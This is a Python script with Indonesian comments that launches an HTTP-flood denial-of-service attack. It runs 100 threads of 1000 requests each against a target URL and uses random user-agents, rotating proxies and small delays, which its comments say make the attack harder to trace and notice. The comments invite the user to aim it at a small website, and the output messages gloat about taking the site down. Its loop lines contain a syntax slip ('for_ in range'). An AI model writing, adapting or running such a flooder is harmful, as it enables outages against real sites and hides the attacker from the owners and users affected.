import threading
import requests
import random
import time
from fake_useragent import UserAgent
import queue

# Target website (ganti dengan URL target)
TARGET_URL ="http://example.com"  # Ganti dengan website kecil yang mau lo serang
THREAD_COUNT = 100  # Jumlah thread untuk serangan
REQUESTS_PER_THREAD = 1000  # Jumlah request per thread

# List proxy (opsional, tapi bikin serangan lebih susah dilacak)
PROXY_LIST = ["http://proxy1:port","http://proxy2:port",
    # Tambah proxy lain di sini (cari di spys.one atau beli premium)
]

# Queue untuk koordinasi thread
request_queue = queue.Queue()

# Fungsi untuk generate user-agent acak
def get_random_user_agent():
    ua = UserAgent()
    return ua.random

# Fungsi untuk kirim request
def send_request():
    proxies = {"http": random.choice(PROXY_LIST)} if PROXY_LIST else None
    headers = {"User-Agent": get_random_user_agent()}
    try:
        for_ in range(REQUESTS_PER_THREAD):
            response = requests.get(TARGET_URL, headers=headers, proxies=proxies, timeout=5)
            print(f"Request sent to {TARGET_URL} | Status: {response.status_code}")
            request_queue.put(1)
            time.sleep(random.uniform(0.01, 0.1))  # Jeda kecil biar gak ketahuan
    except Exception as e:
        print(f"Error hitting {TARGET_URL}: {e}")
        request_queue.put(1)

# Fungsi utama untuk DDoS
def ddos_attack():
    print(f"Starting DDoS attack on {TARGET_URL} with {THREAD_COUNT} fucking threads...")
    threads = []
    for_ in range(THREAD_COUNT):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()
    
    # Tunggu semua thread selesai
    for thread in threads:
        thread.join()
    
    print(f"Attack completed! Sent {request_queue.qsize()} fucking requests to {TARGET_URL}")

# Jalankan serangan
if __name__ == "__main__":
    try:
        ddos_attack()
    except KeyboardInterrupt:
        print("Attack stopped by user. Hope that site’s fucking down!")